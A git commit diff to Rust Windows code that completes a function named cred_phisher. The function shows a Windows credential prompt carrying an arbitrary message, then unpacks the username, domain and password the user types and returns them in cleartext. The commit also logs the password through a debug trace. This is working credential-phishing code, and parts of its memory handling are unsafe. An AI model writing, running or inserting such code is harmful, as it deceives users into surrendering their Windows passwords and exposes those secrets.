748d2ea0af7fd960ba3577b79b150b100eaeb23a
jeppeter <jeppeter@gmail.com>
2022-06-15 17:26:10 +0800

    find error on the credphisher

--- test/tstcases/src/credlib.rs
+++ test/tstcases/src/credlib.rs
@@ -8,10 +8,18 @@ use winapi::um::combaseapi::{CoTaskMemFree};
 use winapi::shared::windef::{HWND,HBITMAP};
 use winapi::shared::minwindef::{DWORD,ULONG,LPVOID,BOOL,FALSE,TRUE};
 use winapi::um::errhandlingapi::{GetLastError,SetLastError};
+use winapi::um::winnt::LPWSTR;
+use winapi::shared::winerror::{ERROR_INSUFFICIENT_BUFFER};
 
-use super::wchar_windows::str_to_c_wstr;
+use super::wchar_windows::{str_to_c_wstr,wstr_to_str};
 
 use std::error::Error;
+
+#[allow(unused_imports)]
+use super::{debug_trace};
+#[allow(unused_imports)]
+use super::loglib::{log_get_timestamp,log_output_function,init_log};
+
 
 extargs_error_class!{CredLibError}
 
@@ -37,9 +45,9 @@ impl CoMemData {
 }
 
 impl Drop for CoMemData {
-	fn drop(&self) {
-		if self.outbuf != std::ptr::null() {
-			CoTaskMemFree(self.outbuf);
+	fn drop(&mut self) {
+		if self.outbuf != std::ptr::null_mut() {
+			unsafe {CoTaskMemFree(self.outbuf);}
 			self.outbuf = std::ptr::null_mut();
 		}
 		self.outsize = 0;
@@ -49,38 +57,56 @@ impl Drop for CoMemData {
 struct WStrBuf {
 	buffer :LPWSTR,
 	bufsize : DWORD,
+	buflen : DWORD,
+	bufv :Vec<u16>,
 }
 
 impl WStrBuf {
 	fn new() -> WStrBuf {
 		WStrBuf {
-			buffer : std::ptr::null(),
+			buffer : std::ptr::null_mut(),
 			bufsize : 0,
+			buflen : 0,
+			bufv :Vec::new(),
 		}
 	}
 
-	fn realloc(&self,size :DWORD) {
-		if self.buffer != std::ptr::null() {
-			std::ptr::drop_in_place(self.buffer.as_ptr());
-		}
-		self.buffer = std::ptr::null();
-		let arr :[std::mem::MaybeUninit<u16>;size] = unsafe{ std::mem::MaybeUninit::uninit().assume_init() };
-		self.buffer = arr.as_ptr();
+	fn realloc(&mut self,size :DWORD) {
+		self.bufv = Vec::with_capacity(size as usize);
+		self.buffer = self.bufv.as_mut_ptr();
 		self.bufsize = size;
 		return;
 	}
+	fn set_len(&mut self, llen :DWORD) {
+		let slen :usize = (llen - 1) as usize;
+		unsafe {
+			self.bufv.set_len(slen);	
+		}
+		
+		self.buflen = slen as DWORD;
+		return;
+	}
+
+	fn to_string(&self) -> Result<String,Box<dyn Error>> {
+		let ostr = wstr_to_str(&self.bufv);
+		if ostr.is_none() {
+			extargs_new_error!{CredLibError,"can not parse {:?}", self.bufv}
+		}
+		let sv :Box<[u8]> = ostr.unwrap();
+		let s1 = unsafe{ std::str::from_utf8(&(*Box::into_raw(sv)))?};
+		let ss = s1.to_string();
+		return Ok(ss);
+	}
+
 }
 
 impl Drop for WStrBuf {
-	fn drop(&self) {
-		if self.buffer != std::ptr::null() {
-			std::ptr::drop_in_place(self.buffer.as_ptr());
-		}
-		self.buffer = std::ptr::null();
-		self.bufsize = 0;
+	fn drop(&mut self) {
+		self.buffer = std::ptr::null_mut();
 		return;
 	}
 }
+
 
 pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
 	let omsg = str_to_c_wstr(msg);
@@ -131,26 +157,49 @@ pub fn cred_phisher( msg :&str) -> Result<NetworkCredentials,Box<dyn Error>> {
 		if dret != 0 {
 			extargs_new_error!{CredLibError,"can not CredUIPromptForWindowsCredentialsW error [{}]", dret}
 		}
+		debug_trace!("outsize [{}]", outcomem.outsize);
 
-		usersize = userbuf.bufsize;
-		domainsize = domainbuf.bufsize;
-		passsize = passbuf.bufsize;
+		while 1 == 1 {
+			usersize = userbuf.bufsize;
+			domainsize = domainbuf.bufsize;
+			passsize = passbuf.bufsize;
 
-		SetLastError(0);
-		bret = CredUnPackAuthenticationBufferW(0,outbuffer,outbufsize,
-			userbuf.buffer,&mut usersize,
-			domainbuf.buffer,&mut domainsize,
-			passbuf.buffer,&mut passsize);
-		if bret == FALSE {
-			errcode = GetLastError();
-			extargs_new_error!{CredLibError,"can not CredUnPackAuthenticationBufferW  {}",errcode}
+			SetLastError(0);
+			bret = CredUnPackAuthenticationBufferW(0,outcomem.outbuf,outcomem.outsize,
+				userbuf.buffer,&mut usersize,
+				domainbuf.buffer,&mut domainsize,
+				passbuf.buffer,&mut passsize);
+			if bret == FALSE {
+				errcode = GetLastError();
+				if errcode != ERROR_INSUFFICIENT_BUFFER {
+					extargs_new_error!{CredLibError,"can not CredUnPackAuthenticationBufferW  {}",errcode}	
+				}
+				userbuf.realloc(userbuf.bufsize << 1);
+				domainbuf.realloc(domainbuf.bufsize << 1);
+				passbuf.realloc(passbuf.bufsize << 1);
+			} else {
+				debug_trace!("bufv {:?} [{}] ",userbuf.bufv,userbuf.bufsize);
+				userbuf.set_len(usersize);
+				domainbuf.set_len(domainsize);
+				passbuf.set_len(passsize);
+				debug_trace!("userlen {} domainlen {} passlen {}",usersize,domainsize,passsize);
+				break;
+			}
 		}
 	}
 
+
+	debug_trace!("bufv {:?}",userbuf.bufv);
+	let names = userbuf.to_string()?;
+	let domains = domainbuf.to_string()?;
+	let passs = passbuf.to_string()?;
+	debug_trace!("passs {} names {} domains {}", passs, names, domains);
+
+
 	let retv = NetworkCredentials{
-		Username : "".to_string(),
-		Password : "".to_string(),
-		Domain : "".to_string(),
+		Username : names,
+		Password : passs,
+		Domain : domains,
 	};
 	Ok(retv)
 }
